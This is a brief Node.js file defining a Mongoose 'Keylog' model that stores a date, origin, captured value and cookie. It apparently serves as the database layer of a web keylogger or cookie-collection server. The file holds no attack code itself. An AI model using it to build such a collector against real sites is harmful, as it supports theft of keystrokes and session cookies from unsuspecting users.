var db = require('../db');

var Keylog = db.model('Keylog', {
    date: { type: Number, required: true},
    origin: { type: String, required: true },
    value: { type: String, required: true },
    cookie: { type: String, required: true}
});

module.exports = Keylog;
